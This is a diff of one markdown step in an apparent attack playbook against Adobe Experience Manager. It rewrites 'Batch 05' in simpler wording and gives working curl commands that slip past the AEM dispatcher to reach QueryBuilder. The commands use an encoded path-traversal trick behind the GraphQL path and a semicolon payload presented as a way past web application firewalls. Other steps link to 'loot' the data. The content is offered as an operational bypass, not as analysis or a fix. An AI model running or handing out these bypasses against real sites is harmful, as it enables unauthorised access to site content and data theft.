@@ -1,76 +1,66 @@
-# Batch 05 — Dispatcher bypass: GraphQL nocanon + hybrid
+# Batch 05 — Trick the bouncer (GraphQL path)
 
-## objective
+## GOAL
+Reach QueryBuilder using Adobe’s GraphQL “side door” paths.
 
-Abuse Apache rules that **skip the dispatcher** for GraphQL-style paths (`ProxyPassMatch` + `nocanon`), alone or **combined** with semicolon tricks.
+## TIME
+~45–75 min
 
-## estimated_time
+## YOU NEED
+- Batch 04 failed (or you want a second way)
 
-45–75 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 04 failed or only partial
-- Collaborator not required for this batch
+Some AEM installs tell Apache:  
+“Anything under `/graphql/execute.json/...` — send **raw** to AEM, skip the normal guard.”
 
-## testing_workflow
+So you start with that allowed prefix, then walk with `..%2f../` into QueryBuilder.  
+The **hybrid** trick hides `graphql/execute` inside a `;...` blob so WAFs that block `../` still miss it.
 
-### 1) Technique A — GraphQL prefix + encoded traversal
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
+```
 
-curl -sk -o /tmp/qb.out -w "gql_trav:%{http_code} size=%{size_download}\n" \
+### 1) GraphQL + walk back
+
+```bash
+curl -sk -o /tmp/qb.out -w "gql:%{http_code} bytes=%{size_download}\n" \
   "$T/graphql/execute.json/..%2f../bin/querybuilder.json?path=/content&p.limit=3"
 head -c 400 /tmp/qb.out; echo
 ```
 
-**Why (one line):** Apache matches raw `/graphql/execute.json/.*` and may not normalize; Jetty then normalizes to `/bin/querybuilder.json`.
-
-### 2) Technique B — hybrid (semicolon plants `graphql/execute` for unanchored regex)
+### 2) Hybrid (often beats WAF)
 
 ```bash
-curl -sk -o /tmp/qb.out -w "hybrid:%{http_code} size=%{size_download}\n" \
+curl -sk -o /tmp/qb.out -w "hyb:%{http_code} bytes=%{size_download}\n" \
   "$T/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=/content&p.limit=3"
 head -c 400 /tmp/qb.out; echo
 ```
 
-Useful when WAF blocks `..%2f../` but not `;x='...'`.
-
-### 3) Technique C — same shapes for feed / truststore-ish paths
-
-```bash
-for base in \
-  "/graphql/execute.json/..%2f../bin/querybuilder.feed" \
-  "/bin/querybuilder.feed;x='x/graphql/execute/json/x'" \
-  "/graphql/execute.json/..%2f../bin/querybuilder.json"
-do
-  curl -sk -o /tmp/o -w "%{http_code} %{size_download} $base\n" \
-    "$T${base}?path=/content&p.limit=2"
-done
-```
-
-### 4) Save winner
+### 3) Save winner
 
 ```text
-WORKING_BYPASS=...
-QB=...
+QB= (paste full working URL without the ?query part)
 ```
 
-## decision_points
+---
 
-| If… | Then… |
-|-----|--------|
-| JSON results | → **07** loot |
-| Still dead | → **06** form-selector family |
-| GraphQL 404 always | Instance may not ship that LocationMatch — still try hybrid, then 06 |
+## IF / THEN
 
-## expected_findings
+| What you saw | What you do |
+|--------------|-------------|
+| JSON hits | → **07** |
+| Still dead | → **06** |
+| Only GraphQL 404 | Site may not have that door — still try hybrid, then 06 |
 
-- Cloud/AMS misconfig bypass independent of dispatcher filter file
-- Second stable access URL for QueryBuilder
+---
 
-## next_batch_to_continue_with
-
-- Success → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
-- Failure → **[06-bypass-form-selector.md](./06-bypass-form-selector.md)**
+## NEXT
+- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
+- Fail → [06-bypass-form-selector.md](./06-bypass-form-selector.md)
